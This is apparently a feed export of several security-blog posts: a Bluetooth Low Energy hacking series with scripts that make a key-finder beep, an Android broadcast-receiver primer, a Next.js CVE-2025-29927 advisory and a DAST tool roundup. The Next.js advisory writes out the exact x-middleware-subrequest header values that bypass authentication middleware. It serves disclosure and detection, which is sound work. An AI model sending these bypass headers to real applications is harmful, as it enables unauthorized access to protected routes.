our interaction using pyserial. Here I’m working from Windows, but Linux will work fine too:\nimport serial\nimport time\n# Set your serial port here (e.g., 'COM3' on Windows or '/dev/ttyUSB0' on Linux)\nSERIAL_PORT = 'COM29'\nBAUDRATE = 115200\n# Commands to send\ncommands = [\n\"bt init\",\n\"bt connect 5B:B1:7F:47:A7:00 random\",\n\"gatt discover\",\n\"gatt write b 0 01\",\n\"BFSLEEP\",\n\"gatt write b 0 00\"\n]\ndef send_command(ser, command):\nprint(f\">>> Sending: {command}\")\nser.write((command + \"\\n\").encode())\ntime.sleep(0.5)\n# Read output (until no more data available)\noutput = []\nwhile True:\nif ser.in_waiting:\nline = ser.readline().decode(errors='ignore').strip()\nprint(line)\noutput.append(line)\nelse:\nbreak\nprint()\ndef main():\ntry:\nwith serial.Serial(SERIAL_PORT, BAUDRATE, timeout=1) as ser:\ntime.sleep(2) # Wait for serial device to be ready\nfor command in commands:\n# Sleep on our side while the DK works...\nif command == \"BFSLEEP\":\ntime.sleep(5)\ncontinue\nsend_command(ser, command)\ntime.sleep(5) # Give the device time to act\nexcept serial.SerialException as e:\nprint(f\"Serial error: {e}\")\nexcept KeyboardInterrupt:\nprint(f\"Keyboard interrupt received...\")\nYou may be able to imagine this also being useful for scripting and fuzzing. You’re also free to replace the shell firmware with something completely custom if you wish too, which could do all the device fuzzing you want from a standalone DK.\nThe only slight downside with this setup is installing the BLE ‘shell’ firmware, it’s a bit of a bigger job than the last posts…\nInstalling Zephyr Projects on NRF dev kits\nThe best bet is to follow Nordic’s own install guide at your time of reading. Copy pasta is easier, though, isn’t it? So here it is – I did the below on Ubuntu, using a virtual environment because I’m building firmware irregularly. Health warning – the file permissions are rotten, and it may just not work for you, but I like being helpful:\nsudo mkdir -p /opt/zephyr\nsudo chown -R $USER:$USER /opt/zephyr\npushd /opt/zephyr\n# Get nrfUtil if you don't already\nsudo wget https://files.nordicsemi.com/ui/api/v1/download?repoKey=swtools&path=external/nrfutil/executables/x86_64-unknown-linux-gnu/nrfutil&isNativeBrowsing=false -O /usr/local/bin/nrfutil\nsudo chmod 0755 /usr/local/bin/nrfutil\nnrfutil install device\nnrfutil install completion\nnrfutil completion install zsh\nnrfutil completion install bash\nwget https://github.com/NordicSemiconductor/nrf-udev/releases/download/v1.0.1/nrf-udev_1.0.1-all.deb -O nrf-udev_1.0.1-all.deb\nsudo dpkg -i nrf-udev_1.0.1-all.deb\n# You may need Segger installed, let's do that anyway\nsudo mkdir -p /opt/segger\nsudo curl -X POST https://www.segger.com/downloads/jlink/JLink_Linux_V818_x86_64.deb --data-raw 'accept_license_agreement=accepted&submit=Download+software' -o /opt/segger/JLink_Linux_V818_x86_64.deb\nsudo dpkg -i /opt/segger/JLink_Linux_V818_x86_64.deb\n# Main install\nsudo apt install --no-install-recommends git cmake ninja-build gperf \\\nccache dfu-util device-tree-compiler wget \\\npython3-dev python3-pip python3-setuptools python3-tk python3-wheel \\\nxz-utils file make gcc gcc-multilib g++-multilib libsdl2-dev libmagic1 \\\npython3-venv ninja-build -y\npython3 -m venv /opt/zephyr/.venv\nsource /opt/zephyr/.venv/bin/activate\npip install west\nwest init /opt/zephyr\nwest update\nwest zephyr-export\npip install -r /opt/zephyr/zephyr/scripts/requirements.txt\n# Install the zephyr project SDK into /opt, rather than $HOME\nwget https://github.com/zephyrproject-rtos/sdk-ng/releases/download/v0.16.0/zephyr-sdk-0.16.0_linux-x86_64.tar.xz\nif wget -O - https://github.com/zephyrproject-rtos/sdk-ng/releases/download/v0.16.0/sha256.sum | shasum --check --ignore-missing ; then\necho '[+] SDK downloaded OK.'\ntar xvf zephyr-sdk-0.16.0_linux-x86_64.tar.xz\n# Now actually move it into /opt\nsudo mv zephyr-sdk-0.16.0 /opt\npushd /opt/zephyr-sdk-0.16.0\n./setup.sh\n# Apply udev rules\nsudo /opt/zephyr-sdk-0.16.0/sysroots/x86_64-pokysdk-linux/usr/share/openocd/contrib/60-openocd.rules /etc/udev/rules.d\nsudo udevadm control --reload\npopd\nelse\necho '[!] SDK download checksum failed. You are on your own, sorry...'\nfi\npopd # In case you were doing something beforehand - you're welcome\nNow you can test that installation before we go any further. Plug in your Nordic/Zephyr board and check it’s supported:\nwest boards\nThen let’s flash a test project to flash the onboard LED:\n# Remembering to source /opt/zephyr/.venv/bin/activate if you opened a new terminal\npushd /opt/zephyr/zephyr\n# For me - west build -p always -b nrf5340dk/nrf5340/cpuapp samples/basic/blinky\nwest build -p always -b <your-board-name> samples/basic/blinky\nwest flash\npopd\nThen you should get blinks on the physical board!!\nIf that worked, installing our NRF shell on the board is just as simple:\n# Remembering to source /opt/zephyr/.venv/bin/activate\npushd /opt/zephyr/zephyr\n# For me - west build -p always -b nrf5340dk/nrf5340/cpuapp tests/bluetooth/shell\nwest build -p always -b <your-board-name> tests/bluetooth/shell\nwest flash\npopd\n# My device is on /dev/ttyACM1\nsudo picocom -b 115200 /dev/ttyACM1\nYou may have had problems initialising Bluteooth with bt init, if so, this probably means you need to flash a network core firmware, in my Nordic dev kit I had a completely blank net core, so I flashed a basic hci-ipc app to that from the test’s directory:\n# Remembering to source /opt/zephyr/.venv/bin/activate\ncp samples/bluetooth/hci_ipc ./my_hci_ipc\necho \"CONFIG_BT_EXT_ADV=y\" >> prj.conf\necho \"CONFIG_BT_PER_ADV=y\" >> prj.conf\nwest build -p always -b nrf5340dk/nrf5340/cpunet .\nwest flash\nAnd voila! We have a working and accessible shell.\nLook forward\nThere’s still so much to learn, and then there’s Bluetooth Classic, which you may come across. Similarly, some communications may be two-way requiring some handshaking between devices to make them do stuff.\nThis was a very simple case, but hopefully you got the devices to trigger and had some fun, that’s the main thing! Want more? Why not try to write a custom firmware that triggers the beep when you press the GPIO buttons?\nHappy Bluetooth hacking!", "timestamp": "2025-10-21T13:34:26.105971"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "Android Broadcast Receivers 101", "url": "https://www.pentestpartners.com/security-blog/android-broadcast-receivers-101/", "published": "Tue, 02 Sep 2025 11:50:29 +0000", "content": "TL;DR\n- Broadcast receivers react to system and app events such as boot, charging, or headset plug-ins.\n- Exported receivers may increase the attack surface of your app\n- Usually defined in the manifest, although it can be created at runtime.\n- From Android 8.0 (API 26), there are futher restrictions in implicit receivers.\n- OEM secret codes can open hidden Activities or privileged menus. Treat them as a real attack surface\nIntroduction\nThis is the next post in our Android 101 series. Today we are looking at broadcast receivers. If you are catching up, start with Android services 101 for background components and scheduling, then Android content providers 101 for shared data surfaces and permissions.\nWhat a broadcast receiver is\nNext in the list of Android components is the broadcast receiver. This component is designed to, well, be a receiver for broadcasts! Broadcasts are sent out when something interesting happens to the operating system or an app, such as the phone being unlocked or starting to charge.\nImplicit and explicit broadcasts, and intents\nBroadcast events can be sent out by the system or a specific app and can be implicit (broadcast to all apps) or explicit (to a specific app). It’s counter-intuitive that you can broadcast to a single destination, but, shrug. The broadcast events are performed by sending intents, which I will write about in a later blog.\nThe receiver can be defined in the manifest using the <receiver> tag, although this is only for explicit and some implicit broadcasts, or it can be programmatically created in the context of an activity or service for any broadcast. This does mean that it can only be received while the object exists.\nEnumerating receivers\nAn app’s receivers can be enumerated from the manifest, although this isn’t perfect, as most implicit receivers will be programmatically added. You can reverse the app’s code, looking for any code that instances BroadcastReceiver, or use dumpsys activity broadcasts, using -p to restrict the package:\nExample: dumpsys output from Chrome\nS111:/ $ dumpsys activity -p com.android.chrome broadcasts | head -20\n[dump_debug] dumpAppId:10159, dumpPackage:com.android.chrome\nACTIVITY MANAGER BROADCAST STATE (dumpsys activity broadcasts)\nRegistered Receivers:\n* ReceiverList{586fdc9 18659 com.android.chrome/10159/u0 remote:9f249d0}\napp=18659:com.android.chrome/u0a159 pid=18659 uid=10159 user=0\nFilter #0: BroadcastFilter{e437cce}\nAction: \"android.hardware.usb.action.USB_DEVICE_ATTACHED\"\nAction: \"android.hardware.usb.action.USB_DEVICE_DETACHED\"\n* ReceiverList{3483a82 18659 com.android.chrome/10159/u0 remote:99e11cd}\napp=18659:com.android.chrome/u0a159 pid=18659 uid=10159 user=0\nFilter #0: BroadcastFilter{a20b593}\nAction: \"android.intent.action.HEADSET_PLUG\"\n* ReceiverList{fb3f8d2 18659 com.android.chrome/10159/u0 remote:fa3975d}\napp=18659:com.android.chrome/u0a159 pid=18659 uid=10159 user=0\nFilter #0: BroadcastFilter{9dd1da3}\nAction: \"android.intent.action.BATTERY_CHANGED\"\nSending broadcasts\nSending a broadcast can be sent with sendBroadcast(Intent), which sends a “Normal Broadcast” to all receivers in an undefined order, or sendOrderedBroadcast(Intent, String) which sends in an ordered fashion, controlled by the priority of the intent-filter on the receiver.\nThey can be sent from the Android command line through the am broadcast program.\nWhat are the risks?\nLike any constantly running process, there are risks about handling any received data, especially if it can run code or manipulate files in the app’s sandbox. This is more pertinent with receivers, due to their purpose.\nManifest examples and code walkthrough\nWe can easily find receivers in the manifest, marked (as I said above) by the <receiver> tag or by using dumpsys activity broadcasts. Then a bit of reverse engineering is needed. In the manifest a receiver definition looks like:\nThe first shows an export receiver that is intended to receive a BOOT_COMPLETED intent. The second is a special type of receiver that I’ll go into later.Looking at the code for the first receiver: com.mediatek.camera.DisableCameraReceiver we can see that it extends the standard BroadcastReceiver class. It handles all of its messages in the onReceive() method:\nThis just receives the message and then initialises the camera as a background task, but there’s no data input, so there’s no injection point here.\nLet’s look at that other receiver: android.provider.Telephony.SECRET_CODE is a special intent action. You may have heard of special codes within the Android dialer [sic], such as *#06# to show your IMEI number. This intent is how apps can extend this feature with more secret codes: just implement a broadcast receiver with an action of android.provider.Telephony.SECRET_CODE and data of the secret code and your receiver will get the intent from the dailer.\nTo use the code, it needs to be surrounded by *#*# and #*#* with the number in the middle, which can be found in the in app’s manifest, in the data tag of the intent-filter for an android.provider.Telephony.SECRET_CODE intent, for example *#*#3646633#*#*. This code on this device will bring up an EngineerMode menu as we can see in the below code, it extends BroadcastReceiver, implements onReceive and sends an intent to start the EngineerMode activity.\nComplications on modern Android\nWith changes to Android since Android 8, broadcast receivers can’t be specified for implicit broadcasts in the manifest. This is to reduce battery use of background receivers. Intents can still be sent, but they must be explicit or to special system actions, such as ACTION_BOOT_COMPLETED.\nIf an intent is sent to an implicit broadcast specified in the manifest, then the system log will include a message like:\n06-11 12:14:00.778 9801 9839 W BroadcastQueue: Background execution not allowed: receiving Intent { act=com.mediatek.engineermode.lte.cmd_start flg=0x400010 } to com.mediatek.engineermode/.lte.CommandToolReceiver\nApps may work around this by programmatically registering any receivers.\nConclusion\nBroadcast Receivers are a rarely used, but important component of the Android system, when written to receive system broadcasts, they can perform actions when an important event happens (e.g. a reboot, or installing a new package).\nAdding SECRET_CODES to the dialer is something that will occasionally be seen on OEM and system apps, but should be rare with user-level apps.\nThat said it’s always worthwhile checking an app’s manifest and performing a dumpsys to look for any receivers when reviewing an app.", "timestamp": "2025-10-21T13:34:26.946464"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "Start hacking Bluetooth Low Energy today! (part 2)", "url": "https://www.pentestpartners.com/security-blog/start-hacking-bluetooth-low-energy-today-part-2/", "published": "Wed, 27 Aug 2025 11:19:08 +0000", "content": "TL;DR\n- Part one showed how to make a £2 key-finder beep with just Android and Linux.\n- This time we step up with budget gear, using a Sonoff dongle for sniffing and a Nordic dongle for control.\n- Together, they let you sniff traffic, identify characteristics, and send commands, turning key finders (and other devices) on and off at will.\n- A cheap but powerful setup for learning BLE hacking before moving on to advanced tools.\nWe made it beep for free (ish)\nIn part one we started hacking Bluetooth and made a little £2 key-finder beep using only Android and Linux. If you haven’t read that post, I would recommend it as a primer to the devices, BLE and what we’re doing, but TLDR we got them to go beep for free (more or less).\nWhat’s next?\nNow we’re deciding we’re serious about BLE hacking and we’re ready to splash the cash, so let’s redo that process with some limited equipment in hand. There are two main budget options for BT hacking I’d recommend:\nWhat you will use\nA Sonoff Zigbee 3.0 USB Dongle Plus (about £20). It is a repurposed Zigbee dongle with a CC26x2 chip that supports Bluetooth. After reflashing, it becomes a capable Bluetooth sniffer with limited send capability. Ensure the model is CC26x2 based before you buy!\nA Nordic mini USB dev board (around £10) A microcontroller regularly used for Bluetooth devices, with a strong suite of supporting tools.\nI think one of each of these is a strong setup – the Sonoff lets us sniff BLE traffic and if the device doesn’t use pairing or bonding, it will all be accessible in cleartext, the nRF dongle lets us interact with BLE devices in quite powerful ways.\nIt’s actually possible to follow this tutorial using only one of the Nordic devices. They can be used to sniff BLE and interact with devices. The process can be found here. Though Nordic does have a habit of moving documentation.\nThere’s a problem with that though, the Nordic sniffer requires you to load a large firmware file onto the dongle and install a Wireshark profile and capture plugin. This is OK if you’re using a full-fat development kit, but to use these smaller (cheaper) dongles you need to wipe away the USB bootloader they contain. This means you’ll either need a JTAG programmer (like a Jlink) to then reuse the board for other stuff, or you’d need two devices so that one can be dedicated to being a sniffer and the other can be reprogrammed to talk to devices.\nFor me the Sonoff is cheap and more capable as a sniffer (better channel hopping and connection following performance), but I keep a spare nRF sniffer dongle around in the back pocket in case the Sonoff is playing up. If for some reason you end up stuck on Windows, using the Sonoff isn’t really supported, but the Nordic Wireshark plugin works fine. Ultimately, use whichever tool works best for you.\nSniffing the traffic with a Sonoff dongle and Sniffle4\nInstalling Sniffle is covered well on NCC’s GitHub page. Follow NCC’s instructions to install Sniffle and its Wireshark extcap script here. However if you want a TLDR, you get yourself a Linux box (mine’s Ubuntu) and do this:\nif [ ! -d /opt/sniffle/Sniffle-1.10.0/python_cli ]; then\necho \"[+] - Sniffle not installed! Installing at 1.10.0...\"\nsudo mkdir -p /opt/sniffle\nsudo chown -R $USER:$USER /opt/sniffle\npushd /opt/sniffle\nwget https://github.com/nccgroup/Sniffle/archive/refs/tags/v1.10.0.tar.gz\ntar xvf v1.10.0.tar.gz\n# Install Wireshark extcap for user and root only\nmkdir -p $HOME/.local/lib/wireshark/extcap\nln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py $HOME/.local/lib/wireshark/extcap\nsudo mkdir -p /root/.local/lib/wireshark/extcap\nsudo ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py /root/.local/lib/wireshark/extcap\npopd\nelse\necho \"[+] - Sniffle already installed at 1.10.0\"\nfi\nThis will install Sniffle for you and also install the Wireshark plugin for both root and the current user.\nYou’ll need the custom firmware installed on the dongle, again well documented by NCC, but for your benefit the commands on my Ubuntu box were:\npushd /opt/sniffle/\nwget https://github.com/nccgroup/Sniffle/releases/download/v1.10.0/sniffle_cc1352p1_cc2652p1_1M.hex\ngit clone https://github.com/sultanqasim/cc2538-bsl.git\ncd cc2538-bsl\npython3 -m venv .venv\nsource .venv/bin/activate\npython3 -m pip install pyserial intelhex\npython3 cc2538-bsl.py -p /dev/ttyUSB0 --bootloader-sonoff-usb -ewv ../sniffle_cc1352p1_cc2652p1_1M.hex\ndeactivate\npopd\nThis allows you to just open Wireshark, plug in the dongle and start sniffing. The traffic here looks a lot different and will include a whole load of other stuff in your local Bluetooth environment vs the Android sniff we did in the last post.\nBecause the devices don’t use pairing or bonding, there is no encryption. This means that even though our sniffer has nothing to do with the BLE connection (unlike last post where we sniffed on the Android device, which is part of the legitimate conversation) we can still view traffic between the target device and the phone.\nTo do this, we can filter for _ws.col.info contains “Sent Write Command” to find any characteristic writes. I did this while triggering the tag alarm and I saw the two characteristic writes we identified in the previous post, just displayed slightly differently. First up 0x01 was written to handle 0x0b:\nThen the 0x00 write to the same handle to cancel the alarm:\nPersonally, I really like the way Sniffle captures can be displayed and filtered in Wireshark, and I’ve got comfortable using it. If we wanted, we could have run this instead of the Android sniff in our last post, or alongside it as a backup. Using Sniffle is also really nice if you need to use e.g. a Windows app to talk to the device, where sniffing is notoriously difficult compared to Android.\nWith Sniffle, you’re also free to sniff in a terminal if you want/need:\npython3 scanner.py --output scan.pcap\n# Only devices with very strong signal\npython3 scanner.py --rssi -40\n# Only for advertisements with a string in them\npython3 sniffer.py --string \"banana\" --output sniff.pcap\nYou can also check out the other tools in that directory, some allow you to send some very limited BLE data or advertise.\nControlling the device with a Nordic nRF52 dongle\nThis time we’ll use the Nordic dongle to control our device, we just need to send the data we just sniffed to the right places.\nI like using the Nordic desktop suite (nRFConnect) which includes a BLE standalone application. To get started, you open the app and plug in your dongle, then select the dongle in the top left of the window; it will be flashed with firmware automatically if needed. Once the device is selected, you can hit ‘scan’ and you’ll get the device view shown below:\nOnce you identify your device, just hit connect and you can see the device’s GATT structure visually:\nHere you can expand all the characteristics and read, write or subscribe (notify) to them.\nWe see the friendly name ‘Alert Level’ for our capability and can write to that characteristic by entering data and pressing the tick:\nAnd the alarm will sound, Magic! Send a 00 to turn off the alarm.\nI find this more reliable than Gatttool by far and a little easier workflow-wise than Android. It’s better for screenshots, and it’s easier for me to get my head around.\nYou can also script connections using blatann, even from Windows. Here’s a little Python snippet to turn our beeps on and off:\nimport time\nimport blatann\n# CONFIG\nCOM_PORT = \"COM29\" # Replace with your COM port, check devmgmt.msc in Windows\nTARGET_MAC = \"5B:B1:7F:47:A7:00\" # Replace with your device MAC address\ntarget_address = blatann.peer.PeerAddress.from_string(TARGET_MAC+ \",p\")\n# CONNECT TO COM PORT\nble_device = blatann.BleDevice(COM_PORT)\nble_device.configure()\nble_device.open()\n# CONNECT TO TARGET DEVICE\nprint(f\"[-] Connecting to {TARGET_MAC}...\")\npeer = ble_device.connect(target_address).wait()\nif not peer:\nprint(\"[!] Connection failed.\")\nble_device.close()\nexit(1)\nprint(\"Connected. Discovering services...\")\npeer.discover_services().wait(5, exception_on_timeout=False)\nfor service in peer.database.services:\nif service.characteristics[0].attributes[1]._handle == 0xb:\nprint(\"[!] Beeping.\")\nservice.characteristics[0].write(b'\\x01')\ntime.sleep(2)\nprint(\"[+] And relax.\")\nservice.characteristics[0].write(b'\\x00')\ntime.sleep(4)\nprint(\"[!] Beeping. Again.\")\nservice.characteristics[0].write(b'\\x01')\ntime.sleep(5)\nprint(\"[+] Relax frfr.\")\nservice.characteristics[0].write(b'\\x00')\n# DISCONNECT GRACEFULLY\nprint(\"[-] Disconnecting. You'll get beeping now, press button to stop it.\")\ntime.sleep(2)\npeer.disconnect()\npeer.wait_for_disconnect()\nble_device.close()\nprint(\"Bye.\")\nLook Forward\nHopefully you can see how this may be useful for more complex devices and interactions, particularly those where you may need to encrypt payloads to send to a characteristic or fuzz a characteristic. I also find this approach more reliable and dynamic than the free tier.\nAll I feel we’re missing here is that command-line flow we love as hackers. When I first heard about this Ubertooth thingy, I was expecting a Bluetooth shell we could use to do recon and hack on devices, but I was disappointed to find it basically did what Sniffle does for us now.\nIn the next instalment of the Bluetooth hacking series, I will introduce you to a more expensive setup that I believe comes closest to my dream of the hacking shell I envisioned when the Ubertooth was first released.\nIf you are considering buying something based off this post, go ahead and pick up a Sonoff, you won’t regret that, but you may want to hold off on the Nordic dongle until the next post…", "timestamp": "2025-10-21T13:34:27.799008"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "Next.js middleware authorization bypass vulnerability: Are you vulnerable?", "url": "https://www.acunetix.com/blog/web-security-zone/next-js-middleware-bypass-vulnerability/", "published": "Tue, 25 Mar 2025 14:41:06 +0000", "content": "A critical vulnerability in the Next.js framework, officially disclosed on March 21, 2025, allows attackers to bypass middleware security controls through a simple header manipulation. This post summarizes what we know about CVE-2025-29927, how you can mitigate the vulnerability, and how Acunetix can help you detect and confirm your organization’s risk.\nWhat you need to know about CVE-2025-29927\n- A remote authorization bypass vulnerability identified as CVE-2025-29927 was confirmed in Next.js, one of the most popular React frameworks used to build web applications.\n- The vulnerability allows attackers to completely bypass Next.js functionality in an application, including commonly used critical security functions such as authentication and authorization.\n- As of March 24, 2025, Acunetix has an active security check to detect and report exploitable Next.js versions.\n- The vulnerability affects the following Next.js versions:\n- Next.js 11.1.4 through 13.5.6 (unpatched)\n- Next.js 14.x before 14.2.25\n- Next.js 15.x before 15.2.3\n- Upgrading to a non-vulnerable version is the only guaranteed fix. Proxy-level WAF blocking may work temporarily but is not recommended in the long run.\nUnderstand your Next.js middleware bypass risk\nThe vulnerability allows attackers to completely bypass the middleware functionality by including a specially crafted x-middleware-subrequest\nheader in their requests. You can think of middleware as a processing chain that lets software modules inspect, modify, or reroute an HTTP request before it reaches its final code handler. It is a natural place to implement things like authentication, and one very common pattern is to have middleware redirect to a login page if no valid authentication cookie is found.\nThis vulnerability is particularly concerning because Next.js middleware is commonly used for critical security functions such as authentication, authorization, path rewriting, and implementing security headers. All of these can be trivially bypassed by an attacker simply by using a special HTTP header.\nAre you vulnerable to the Next.js middleware bypass?\nIf your answer to BOTH of the following questions is “yes”, your application is vulnerable unless patched:\n- Do you rely on Next.js middleware for security controls?\n- Are you running a self-hosted Next.js application using\nnext start\nwithoutput: 'standalone'\n?\nApplications are particularly at risk if:\n- You use middleware for authentication or authorization checks\n- You rely on middleware for implementing security headers like Content Security Policy (CSP), used to define limitations on where resources are permitted to be loaded\n- You use middleware for path rewriting to restrict access to certain routes\nApplications hosted on Vercel or Netlify are not affected, as these platforms have implemented mitigations at their edge layers. Applications deployed as static exports (where middleware is not executed) are also not affected.\nIf you don’t know the details of your Next.js usage or want the ability to assess it independently, running an automated DAST tool to confirm your vulnerability is a great place to start.\nHow the Next.js middleware vulnerability works\nNext.js middleware uses an internal header called x-middleware-subrequest\nto prevent recursive requests from triggering infinite loops. The security vulnerability allows an attacker to manipulate this header to trick the Next.js application into skipping middleware execution entirely.\nFor different versions of Next.js, the exploit works slightly differently:\n- For older versions (pre-12.2):\nx-middleware-subrequest: pages/_middleware\n- For modern versions:\nx-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\n(orsrc/middleware:src/middleware:src/middleware:src/middleware:src/middleware\nif using thesrc\ndirectory)\nWhen this header is present with the appropriate value, the middleware is completely bypassed, allowing the request to reach its original destination without any security checks or modifications that would have been applied by the middleware.\nHow Invicti DAST products detect CVE-2025-29927\nActive detection logic (Acunetix)\nInvicti’s security research team has developed a check for the Acunetix engine to detect if your applications are vulnerable to CVE-2025-29927. As of Monday, March 24, 2025, this check is live for all Acunetix Premium customers.\nHere’s how the active check works step by step:\n- Identify Next.js middleware usage: The check first looks for the telltale signs of Next.js middleware, specifically a 307 redirect where the response body equals the location header value. This pattern is unique to Next.js middleware redirects.\n- Verify Next.js framework presence: Confirm the application is using Next.js by checking for the\nx-powered-by: Next.js\nheader in responses. - Test with bypass payloads: The detection mechanism tries different bypass payloads based on the potential Next.js version:\n- For newer versions (13.2.0+):\nmiddleware:middleware:middleware:middleware:middleware\n(and thesrc\nvariant) - For older versions (pre-12.2):\npages/_middleware\n- For intermediate versions (12.2 to 13.2.0):\nmiddleware\n- For newer versions (13.2.0+):\n- Validation through contrast: To avoid false positives, the test performs multiple validation checks:\n- Send a request with the potential bypass header and check if it returns a 200 OK.\n- Send a control request with a slightly modified header, such as\nY-Middleware-Subrequest\n, to confirm it still redirects (307). - Send another request with an invalid value to confirm proper behavior.\n- Repeat the successful bypass to ensure consistency.\n- Confirm vulnerability: Only after all validation steps pass is the vulnerability confirmed, reducing the risk of false positives.\nPassive detection through traffic analysis with dynamic SCA (Invicti)\nThe vulnerability is detected through passive monitoring of web traffic during a security scan without making active requests. Invicti Enterprise uses this technique with its vulnerability database to detect the flaw. This technique looks for the x-powered-by: Next.js\nheader in responses, which confirms the application is using Next.js. The presence of the vulnerable version is further confirmed by evaluating the next.version\nfunction in the browser’s JavaScript context to extract the precise version\nWe then compare this value to our continuously updated database of known CVEs and network detection signatures to determine if an insecure version of Next.js has been encountered.\nAs of Tuesday, March 25, 2025, this check is live for all Invicti Enterprise, Invicti Standard, and Acunetix 360 customers.\nMitigation steps for CVE-2025-29927\n- Update immediately:\n- For Next.js 15.x: Update to ≥ 15.2.3\n- For Next.js 14.x: Update to ≥ 14.2.25\n- For Next.js 13.x: Update to ≥ 13.5.9\n- For Next.js 12.x: Update to ≥ 12.3.5\n- If updating isn’t possible immediately:\n- Block the\nx-middleware-subrequest\nheader at your edge/proxy level (not in middleware itself). - Cloudflare users can enable a Managed WAF rule that blocks this attack. Be aware that Cloudflare has changed this WAF rule to be opt-in after reports of 3rd party authentication frameworks being impacted. We suggest you focus on upgrading Next.js.\n- Block the\nInvicti Security would like to acknowledge Rachid Allam and Yasser Allam for their original research and writeup of their findings, as well as our internal teams that worked to turn out a check to customers within a single business day.\nOur security team is continuously monitoring this situation and will update as more information becomes available.\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:33.137521"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "Top 10 dynamic application security testing (DAST) tools for 2025", "url": "https://www.acunetix.com/blog/web-security-zone/10-best-dast-tools/", "published": "Thu, 20 Mar 2025 11:26:23 +0000", "content": "What is DAST and how does it work?\nDynamic application security testing (DAST) is a cybersecurity assessment method that analyzes running applications to identify security vulnerabilities. Unlike static application security testing (SAST), which examines source code before deployment, DAST scanning simulates real-world attacks by probing a web app’s inputs and responses. The term DAST is generally understood to refer to automated security testing using vulnerability assessment tools.\nFor small and mid-sized businesses, ease of use and speed are crucial when selecting a DAST solution. Many SMBs do not have dedicated security teams, so tools that provide automated scanning, straightforward setup, and actionable reports are essential. DAST tools help detect security flaws such as SQL injection (SQLi), cross-site scripting (XSS), authentication issues, and misconfigurations, providing an effective first layer of defense against hackers. They work as black-box testing solutions, meaning they do not require access to source code, which makes them compatible with various programming languages and web application security frameworks.\nWhy DAST-first is a better approach to AppSec\nWhen it comes to testing their applications, most organizations rely on SAST, software composition analysis (SCA), and other static scanning tools that flood developers and security teams with false positives and non-actionable findings—and that’s a problem:\n- SAST and SCA don’t prove exploitability but do frequently generate hundreds of alerts without showing what can actually be reached and attacked.\n- Developers get overwhelmed and waste time fixing low-risk issues instead of real threats—and eventually start treating all security warnings as false alarms.\n- Security teams lack clear prioritization when you can’t separate critical issues from less urgent tasks and from sheer noise.\nA DAST-first approach flips this on its head:\n- DAST scanning focuses on what attackers see by probing live applications to find exploitable vulnerabilities.\n- Automated validation confirms potential vulnerabilities with features like proof-based scanning to cut through false positives.\n- Faster remediation and higher efficiency with short time to value as teams focus on first fixing what matters most.\nBest DAST tools for 2025\n1. Invicti: DAST-first AppSec platform\nInvicti provides an enterprise-grade, DAST-first application security platform with advanced automation. Its proprietary proof-based scanning technology automatically and safely confirms exploitable vulnerabilities, achieving a 99.98% accuracy rate and virtually eliminating false positives for these security flaws. Invicti’s Predictive Risk Scoring helps prioritize testing and remediation based on risk of real-world exploitation, while vulnerability reports include detailed technical information and remediation guidance, not just generic CVSS scores. With over 50 integrations (including GitHub, Jira, ServiceNow, and Jenkins), Invicti seamlessly fits into existing workflows and CI/CD pipelines.\nAs a complete AppSec platform, Invicti supports modern web technologies, including JavaScript-heavy applications, SPAs, and all major API types (REST, SOAP, GraphQL, gRPC). It also incorporates native IAST (interactive application security testing) for deeper coverage without code instrumentation and dynamic SCA for increased component security, as well as SAST, static SCA, and Container Security powered by Mend.io. Invicti (formerly Netsparker) provides comprehensive security by supporting automated vulnerability scanning and vulnerability management in a continuous process across the software development lifecycle—all on a unified platform that also incorporates discovery.\n2. Acunetix by Invicti: DAST for SMBs\nAcunetix by Invicti is a powerful DAST-only web vulnerability scanner tailored for smaller businesses and mid-sized enterprises just starting their application security programs. It provides fast, automated security testing at a price point accessible to SMBs.\nLike Invicti, Acunetix features proof-based scanning to validate vulnerabilities and Predictive Risk Scoring to prioritize testing and remediation. Its ease of use and rapid deployment make it an ideal entry point for companies beginning their AppSec journey.\n3. PortSwigger Burp Suite Professional\nBurp Suite is a well-known tool among security professionals and penetration testers. While it offers some automation, it is better suited for businesses that require manual testing and customizable security assessments rather than fully automated, plug-and-play scanning. With its plugins and interactive attack surface analysis features, it is a valuable asset for penetration testing efforts.\n4. Checkmarx DAST tools\nCheckmarx DAST is part of a web application security suite that includes static and interactive security testing. It integrates with Checkmarx security intelligence for enhanced vulnerability detection and prioritization, complementing SAST tools and SCA for more holistic security coverage.\n5. Rapid7 InsightAppSec\nInsightAppSec is a cloud-based DAST solution designed for modern web applications and APIs, featuring dynamic attack simulations and SIEM integration to enhance threat response. Its automation capabilities help identify security flaws while integrating with DevOps workflows.\n6. HCL AppScan\nHCL AppScan is designed to help smaller businesses automate security testing without complex configurations. It provides vulnerability assessment scanning tools and security insights in an easy-to-use package, making it an option for teams that need straightforward security testing.\n7. OpenText Fortify WebInspect\nWebInspect provides an extensive security scanner that may be more than what many SMBs need. It is best suited for businesses that require advanced security features, but those looking for fast and easy scanning solutions may find simpler alternatives more effective. It offers web application security testing, including API security assessments and framework compatibility.\n8. Black Duck DAST tools\nBlack Duck, formerly known as Synopsys, offers two DAST products: Continuous Dynamic and Polaris fAST Dynamic. Continuous Dynamic is a DAST tool designed to identify security vulnerabilities in web applications by using automated scanning and analysis. Polaris fAST Dynamic is a separate DAST solution that focuses on streamlining the testing process for web applications.\n9. Veracode Dynamic Analysis\nVeracode’s DAST solution offers continuous security testing through automated vulnerability detection, CI/CD integration, and regular scanning for ongoing protection, making it suitable for enterprises with stringent compliance requirements.\n10. ZAP by Checkmarx (formerly OWASP ZAP)\nZAP is an open-source tool that can be a cost-effective vulnerability scanning option for SMBs with the technical expertise to deploy it and manually triage results. While it requires more manual configuration than commercial tools and provides no automation, ZAP gives flexibility and customization for businesses that want to tailor their security testing. With its extensive plugins, it is also used by penetration testers looking to enhance and customize their security assessments.\nThe benefits of a DAST-first approach\nSecurity isn’t about finding everything but about finding and addressing the right things. Taking a DAST-first approach with the right tools has major advantages for small and mid-sized businesses:\n- Cut through the noise: DAST finds and flags vulnerabilities that malicious hackers could actually use, showing you your realistic security posture.\n- Work with verified and actionable 